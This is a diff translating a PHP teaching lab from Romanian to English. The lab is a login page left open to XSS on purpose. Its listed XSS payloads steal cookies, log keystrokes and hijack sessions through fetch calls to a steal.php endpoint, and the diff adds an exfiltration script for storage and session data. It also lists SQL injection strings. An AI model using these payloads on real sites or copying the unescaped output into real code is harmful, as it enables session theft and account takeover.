@@ -1,13 +1,13 @@
 <?php
-// Activează afișarea erorilor pentru debugging
+// Enable error display for debugging
 ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 
-// ATENȚIE: Acest cod este SECURIZAT pentru SQL injection dar VULNERABIL pentru XSS
-// Folosește doar în mediu de testare/educațional, NICIODATĂ în producție!
+// WARNING: This code is SECURE against SQL injection but VULNERABLE to XSS
+// Use only in testing/educational environment, NEVER in production!
 
-// Configurarea bazei de date
+// Database configuration
 $servername = "localhost";
 $username = "root";
 $password = "";
@@ -16,30 +16,30 @@ $dbname = "test_db";
 $conn = null;
 $setup_message = "";
 
-// Funcție pentru setup-ul bazei de date - REPARATĂ
+// Database setup function - FIXED
 if (isset($_GET['setup'])) {
     try {
-        // Conectează-te la MySQL fără a specifica baza de date
+        // Connect to MySQL without specifying the database
         $conn_setup = new mysqli($servername, $username, $password);
         
         if ($conn_setup->connect_error) {
             throw new Exception("Connection failed: " . $conn_setup->connect_error);
         }
         
-        // Creează baza de date
+        // Create database
         $sql_create_db = "CREATE DATABASE IF NOT EXISTS test_db";
         if ($conn_setup->query($sql_create_db) === TRUE) {
             $setup_message .= "Database 'test_db' created successfully.<br>";
         }
         
-        // Selectează baza de date
+        // Select database
         $conn_setup->select_db($dbname);
         
-        // ȘTERGE COMPLET tabelul pentru a evita conflictele de structură
+        // COMPLETELY DROP table to avoid structure conflicts
         $conn_setup->query("DROP TABLE IF EXISTS users");
         $setup_message .= "Old table 'users' dropped.<br>";
         
-        // Creează tabelul cu STRUCTURA COMPLETĂ
+        // Create table with COMPLETE STRUCTURE
         $sql_create_table = "CREATE TABLE users (
             id INT AUTO_INCREMENT PRIMARY KEY,
             username VARCHAR(50) NOT NULL UNIQUE,
@@ -56,7 +56,7 @@ if (isset($_GET['setup'])) {
             throw new Exception("Error creating table: " . $conn_setup->error);
         }
         
-        // Inserează utilizatori de test FOLOSIND PREPARED STATEMENTS
+        // Insert test users USING PREPARED STATEMENTS
         $users = [
             ['admin', 'admin123', 'admin@test.com', 'admin', 'System Administrator'],
             ['user1', 'password1', 'user1@test.com', 'user', 'Regular User'],
@@ -65,7 +65,7 @@ if (isset($_GET['setup'])) {
             ['john', 'john2024', 'john@company.com', 'manager', 'Manager Profile']
         ];
         
-        // SECURE: Folosește prepared statements pentru insert
+        // SECURE: Use prepared statements for insert
         $stmt = $conn_setup->prepare("INSERT INTO users (username, password, email, role, profile_note) VALUES (?, ?, ?, ?, ?)");
         
         if (!$stmt) {
@@ -91,7 +91,7 @@ if (isset($_GET['setup'])) {
     }
 }
 
-// Conectează-te la baza de date pentru operațiuni normale
+// Connect to database for normal operations
 $conn = null;
 $db_error = null;
 
@@ -106,7 +106,7 @@ try {
     $db_error = $e->getMessage();
 }
 
-// Gestionarea logout-ului
+// Handle logout
 if (isset($_GET['logout'])) {
     session_start();
     session_destroy();
@@ -114,10 +114,10 @@ if (isset($_GET['logout'])) {
     exit();
 }
 
-// Începe sesiunea pentru a păstra starea de login
+// Start session to maintain login state
 session_start();
 
-// ✅ SECURE: Procesarea formularului de login cu PREPARED STATEMENTS
+// ✅ SECURE: Login form processing with PREPARED STATEMENTS
 $login_result = "";
 $executed_query = "";
 $sql_error = "";
@@ -130,7 +130,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($
         $user = $_POST['username'];
         $pass = $_POST['password'];
         
-        // ✅ SECURE: Folosește prepared statements pentru a preveni SQL injection
+        // ✅ SECURE: Use prepared statements to prevent SQL injection
         $stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
         if (!$stmt) {
             $login_result = "error";
@@ -148,7 +148,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($
                     $login_result = "success";
                     $user_data = $row;
                     
-                    // Salvează datele utilizatorului în sesiune
+                    // Save user data in session
                     $_SESSION['logged_in'] = true;
                     $_SESSION['user_id'] = $row['id'];
                     $_SESSION['username'] = $row['username'];
@@ -170,7 +170,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['username']) && isset($
     }
 }
 
-// ❌ VULNERABLE: Profile update cu XSS vulnerability
+// ❌ VULNERABLE: Profile update with XSS vulnerability
 $profile_update_message = "";
 if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['update_profile']) && isset($_SESSION['logged_in'])) {
     if ($conn === null) {
@@ -178,7 +178,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['update_profile']) && i
     } else {
         $new_note = $_POST['profile_note']; // ❌ NO XSS PROTECTION!
         
-        // ✅ SECURE SQL: Folosește prepared statement
+        // ✅ SECURE SQL: Use prepared statement
         $stmt = $conn->prepare("UPDATE users SET profile_note = ? WHERE id = ?");
         if (!$stmt) {
             $profile_update_message = "Error preparing statement: " . $conn->error;
@@ -186,7 +186,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['update_profile']) && i
             $stmt->bind_param("si", $new_note, $_SESSION['user_id']);
             
             if ($stmt->execute()) {
-                $_SESSION['profile_note'] = $new_note; // ❌ Update session fără sanitizare
+                $_SESSION['profile_note'] = $new_note; // ❌ Update session without sanitization
                 $profile_update_message = "Profile updated successfully!";
             } else {
                 $profile_update_message = "Error updating profile: " . $stmt->error;
@@ -202,7 +202,7 @@ if ($conn && !$conn->connect_error) {
 ?>
 
 <!DOCTYPE html>
-<html lang="ro">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -386,7 +386,7 @@ if ($conn && !$conn->connect_error) {
         <div class="user-session">
             <div class="session-info">
                 <div class="session-details">
-                    <strong>🔐 Sesiune activă:</strong><br>
+                    <strong>🔐 Active Session:</strong><br>
                     <strong>User:</strong> <?php echo htmlspecialchars($_SESSION['username']); ?> 
                     (<?php echo htmlspecialchars($_SESSION['role']); ?>)<br>
                     <strong>Email:</strong> <?php echo htmlspecialchars($_SESSION['email']); ?><br>
@@ -402,7 +402,7 @@ if ($conn && !$conn->connect_error) {
     <?php endif; ?>
 
     <div class="warning">
-        <strong>⚠️ ATENȚIE:</strong> Acest formular este <span class="secure-badge">SECURIZAT pentru SQL injection</span> dar <span class="vulnerable-badge">VULNERABIL pentru XSS attacks</span> în mod intenționat pentru scopuri educaționale!
+        <strong>⚠️ WARNING:</strong> This form is <span class="secure-badge">SECURE against SQL injection</span> but <span class="vulnerable-badge">VULNERABLE to XSS attacks</span> intentionally for educational purposes!
     </div>
 
     <!-- Database Status -->
@@ -420,13 +420,13 @@ if ($conn && !$conn->connect_error) {
                 <?php if ($db_error): ?>
                     <strong>Error:</strong> <?php echo htmlspecialchars($db_error); ?><br>
                 <?php endif; ?>
-                <small>Asigură-te că MySQL rulează și rulează setup-ul mai întâi.</small>
+                <small>Make sure MySQL is running and run the setup first.</small>
             </div>
         <?php endif; ?>
     </div>
 
     <div class="container">
-        <h3>🔧 Setup Baza de Date</h3>
+        <h3>🔧 Database Setup</h3>
         <?php if ($setup_message): ?>
             <div class="success">
                 <strong>Setup Status:</strong><br>
@@ -434,9 +434,9 @@ if ($conn && !$conn->connect_error) {
             </div>
         <?php endif; ?>
         
-        <a href="?setup=1" class="btn">Creează/Resetează Baza de Date</a>
+        <a href="?setup=1" class="btn">Create/Reset Database</a>
         
-        <h4>Utilizatori de test:</h4>
+        <h4>Test users:</h4>
         <table class="users-table">
             <tr>
                 <th>Username</th>
@@ -480,18 +480,18 @@ if ($conn && !$conn->connect_error) {
 
         <?php if ($login_result == "success"): ?>
             <div class="success">
-                <h3>✅ Login reușit!</h3>
-                <strong>Bun venit, <?php echo htmlspecialchars($user_data['username']); ?>!</strong><br>
+                <h3>✅ Login successful!</h3>
+                <strong>Welcome, <?php echo htmlspecialchars($user_data['username']); ?>!</strong><br>
                 <strong>Email:</strong> <?php echo htmlspecialchars($user_data['email']); ?><br>
                 <strong>Role:</strong> <?php echo htmlspecialchars($user_data['role']); ?><br>
                 <strong>ID:</strong> <?php echo htmlspecialchars($user_data['id']); ?><br>
-                <small>Pagina se va reîncărca pentru a afișa sesiunea...</small>
+                <small>Page will reload to show session...</small>
                 <script>setTimeout(function(){ window.location.reload(); }, 2000);</script>
             </div>
         <?php elseif ($login_result == "failed"): ?>
             <div class="error">
                 <strong>❌ Login failed!</strong><br>
-                Username sau password greșite.
+                Wrong username or password.
             </div>
         <?php elseif ($login_result == "error"): ?>
             <div class="error">
@@ -504,16 +504,16 @@ if ($conn && !$conn->connect_error) {
     
     <!-- User Dashboard with XSS Vulnerability -->
     <div class="container">
-        <h2>🎯 Dashboard - Utilizator Autentificat <span class="vulnerable-badge">XSS VULNERABLE</span></h2>
+        <h2>🎯 Dashboard - Authenticated User <span class="vulnerable-badge">XSS VULNERABLE</span></h2>
         <div class="success">
-            <h3>Bun venit în zona securizată!</h3>
-            <p>Ești logat ca <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong> cu rolul de <strong><?php echo htmlspecialchars($_SESSION['role']); ?></strong>.</p>
+            <h3>Welcome to the secure area!</h3>
+            <p>You are logged in as <strong><?php echo htmlspecialchars($_SESSION['username']); ?></strong> with the role of <strong><?php echo htmlspecialchars($_SESSION['role']); ?></strong>.</p>
             
-            <h4>Informații sesiune:</h4>
+            <h4>Session information:</h4>
             <ul>
                 <li><strong>User ID:</strong> <?php echo $_SESSION['user_id']; ?></li>
                 <li><strong>Email:</strong> <?php echo htmlspecialchars($_SESSION['email']); ?></li>
-                <li><strong>Timp login:</strong> <?php echo $_SESSION['login_time']; ?></li>
+                <li><strong>Login time:</strong> <?php echo $_SESSION['login_time']; ?></li>
                 <li><strong>Session ID:</strong> <?php echo session_id(); ?></li>
             </ul>
         </div>
@@ -574,16 +574,16 @@ if ($conn && !$conn->connect_error) {
     <!-- XSS Examples -->
     <div class="container">
         <div class="xss-examples">
-            <h4>🎯 XSS Payload Examples pentru Profile Note:</h4>
+            <h4>🎯 XSS Payload Examples for Profile Note:</h4>
             
             <h5>1. Basic Alert:</h5>
             <div class="payload">&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</div>
             
             <h5>2. Cookie Stealing:</h5>
-            <div class="payload">&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</div>
+            <div class="payload">&lt;script&gt;document.location='http://localhost/steal.php?cookie='+document.cookie&lt;/script&gt;</div>
             
             <h5>3. Keylogger:</h5>
-            <div class="payload">&lt;script&gt;document.addEventListener('keypress', function(e) { fetch('http://attacker.com/log.php?key=' + e.key); });&lt;/script&gt;</div>
+            <div class="payload">&lt;script&gt;document.addEventListener('keypress', function(e) { fetch('http://localhost/steal.php?key=' + e.key); });&lt;/script&gt;</div>
             
             <h5>4. HTML Injection:</h5>
             <div class="payload">&lt;img src="x" onerror="alert('XSS via img tag')"&gt;</div>
@@ -595,23 +595,39 @@ if ($conn && !$conn->connect_error) {
             <div class="payload">&lt;form onsubmit="alert('Form hijacked: ' + this.username.value); return false;"&gt;&lt;input name="username" placeholder="Fake login"&gt;&lt;/form&gt;</div>
             
             <h5>7. Session Hijacking:</h5>
-            <div class="payload">&lt;script&gt;fetch('http://attacker.com/session.php', {method: 'POST', body: 'session_id=' + '<?php echo session_id(); ?>'});&lt;/script&gt;</div>
+            <div class="payload">&lt;script&gt;fetch('http://localhost/steal.php', {method: 'POST', body: 'session_id=' + '<?php echo session_id(); ?>'});&lt;/script&gt;</div>
+            
+            <h5>8. Advanced Data Exfiltration:</h5>
+            <div class="payload">&lt;script&gt;
+var data = {
+    cookies: document.cookie,
+    sessionId: '<?php echo session_id(); ?>',
+    url: window.location.href,
+    localStorage: JSON.stringify(localStorage),
+    sessionStorage: JSON.stringify(sessionStorage)
+};
+fetch('http://localhost/steal.php', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(data)
+});
+&lt;/script&gt;</div>
         </div>
     </div>
 
     <!-- Failed SQL Injection Examples -->
     <div class="container">
         <div class="xss-examples" style="background: #d4edda;">
-            <h4>🛡️ SQL Injection Attempts (TOATE VOR EȘUA):</h4>
-            <p><strong>Acestea NU vor funcționa datorită prepared statements:</strong></p>
+            <h4>🛡️ SQL Injection Attempts (ALL WILL FAIL):</h4>
+            <p><strong>These will NOT work due to prepared statements:</strong></p>
             
-            <h5>Tentative care vor eșua:</h5>
-            <div class="payload" style="border-left-color: #28a745;">Username: ' OR '1'='1' -- (VA EȘUA)</div>
-            <div class="payload" style="border-left-color: #28a745;">Username: ' UNION SELECT * FROM users -- (VA EȘUA)</div>
-            <div class="payload" style="border-left-color: #28a745;">Username: '; DROP TABLE users; -- (VA EȘUA)</div>
-            <div class="payload" style="border-left-color: #28a745;">Username: ' AND SLEEP(5) -- (VA EȘUA)</div>
+            <h5>Attempts that will fail:</h5>
+            <div class="payload" style="border-left-color: #28a745;">Username: ' OR '1'='1' -- (WILL FAIL)</div>
+            <div class="payload" style="border-left-color: #28a745;">Username: ' UNION SELECT * FROM users -- (WILL FAIL)</div>
+            <div class="payload" style="border-left-color: #28a745;">Username: '; DROP TABLE users; -- (WILL FAIL)</div>
+            <div class="payload" style="border-left-color: #28a745;">Username: ' AND SLEEP(5) -- (WILL FAIL)</div>
             
-            <p><em>Toate aceste payload-uri vor fi tratate ca stringuri literale datorită prepared statements!</em></p>
+            <p><em>All these payloads will be treated as literal strings due to prepared statements!</em></p>
         </div>
     </div>
 
@@ -620,7 +636,7 @@ if ($conn && !$conn->connect_error) {
         <div class="error">
             <strong>Database Connection Error:</strong><br>
             <?php echo htmlspecialchars($db_error); ?><br>
-            <small>Asigură-te că MySQL rulează și că ai rulat setup-ul mai întâi.</small>
+            <small>Make sure MySQL is running and that you have run the setup first.</small>
         </div>
     </div>
     <?php endif; ?>
